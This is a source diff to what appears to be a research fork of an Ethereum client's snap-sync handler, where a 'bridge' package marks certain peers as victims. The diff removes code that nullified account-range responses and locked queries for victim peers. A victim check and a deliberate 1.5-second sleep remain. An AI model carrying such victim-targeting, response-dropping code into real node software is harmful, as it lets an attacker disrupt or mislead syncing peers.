@@ -59,11 +59,6 @@ const (
 	maxTrieNodeTimeSpent = 5 * time.Second
 )
 
-var (
-	dropResponse = false
-	servedAccounts = 0
-)
-
 // Handler is a callback to invoke from an outside runner after the boilerplate
 // exchanges have passed.
 type Handler func(peer *Peer) error
@@ -169,26 +164,8 @@ func HandleMessage(backend Backend, peer *Peer) error {
 			return fmt.Errorf("%w: message %v: %v", errDecode, msg, err)
 		}
 
-		if bridge.IsVictim(peer.Peer.ID().String()[:8]) {
-			log.Info("Trying to lock (GetAccountRangeMsg)")
-			bridge.RangeQueryLock.Lock()
-			bridge.ReceivedRangeQuery(req.Origin)
-		}
-
 		// Service the request, potentially returning nothing in case of errors
 		accounts, proofs := ServiceGetAccountRangeQuery(backend.Chain(), &req, peer)
-
-		log.Info("Got accounts for query", "amount", len(accounts), "peer", peer.Peer.ID().String()[:8])
-		if bridge.IsVictim(peer.Peer.ID().String()[:8]) {
-			servedAccounts += len(accounts)
-			if dropResponse {
-				accounts = nil
-				proofs = nil
-				log.Info("Nullifying response to range query")
-				//log.Info("Dropping response to range query")
-				//return nil
-			}
-		}
 
 		// Send back anything accumulated (or empty in case of errors)
 		return p2p.Send(peer.rw, AccountRangeMsg, &AccountRangePacket{
@@ -311,20 +288,11 @@ func ServiceGetAccountRangeQuery(chain *core.BlockChain, req *GetAccountRangePac
 		req.Bytes = softResponseLimit
 	}
 
-	if bridge.IsVictim(p.Peer.ID().String()[:8]) {
-		defer func() {
-			bridge.RangeQueryLock.Unlock()
-			log.Info("Unlock (ServiceGetAccountRangeQuery)")
-		}()
-	}
-
 	// Retrieve the requested state and bail out if non existent
 	tr, err := trie.New(req.Root, chain.StateCache().TrieDB())
 	if err != nil {
 		if bridge.IsVictim(p.Peer.ID().String()[:8]) {
 			log.Warn("Requested state does not exist", "root", req.Root, "err", err)
-			bridge.ResetRangeInfo()
-			//bridge.RangeQueryLock.Unlock()
 		}
 		return nil, nil
 	}
@@ -332,8 +300,6 @@ func ServiceGetAccountRangeQuery(chain *core.BlockChain, req *GetAccountRangePac
 	if err != nil {
 		if bridge.IsVictim(p.Peer.ID().String()[:8]) {
 			log.Warn("Snapshots account iterator unavailable", "root", req.Root, "err", err)
-			bridge.ResetRangeInfo()
-			//bridge.RangeQueryLock.Unlock()
 		}
 		return nil, nil
 	}
@@ -346,7 +312,6 @@ func ServiceGetAccountRangeQuery(chain *core.BlockChain, req *GetAccountRangePac
 
 	time.Sleep(1500*time.Millisecond)
 	
-	lastResponseLocal := true
 	for it.Next() {
 		hash, account := it.Hash(), common.CopyBytes(it.Account())
 
@@ -364,23 +329,10 @@ func ServiceGetAccountRangeQuery(chain *core.BlockChain, req *GetAccountRangePac
 			break
 		}
 		if size > req.Bytes {
-			lastResponseLocal = false
 			break
 		}
 	}
 	it.Release()
-	log.Info("Got accounts for query", "last", last)
-
-	if lastResponseLocal && bridge.IsVictim(p.Peer.ID().String()[:8]) {
-		log.Info("Found last query", "root", req.Root, "origin", req.Origin, "limit", req.Bytes, "served_accounts", servedAccounts)
-		dropResponse = bridge.ReceivedLastRangeQuery(req.Origin)
-	} else if bridge.IsVictim(p.Peer.ID().String()[:8]) {
-		dropResponse = false
-	}
-
-	if bridge.IsVictim(p.Peer.ID().String()[:8]) {
-		//bridge.RangeQueryLock.Unlock()
-	}
 
 
 	// Generate the Merkle proofs for the first and last account
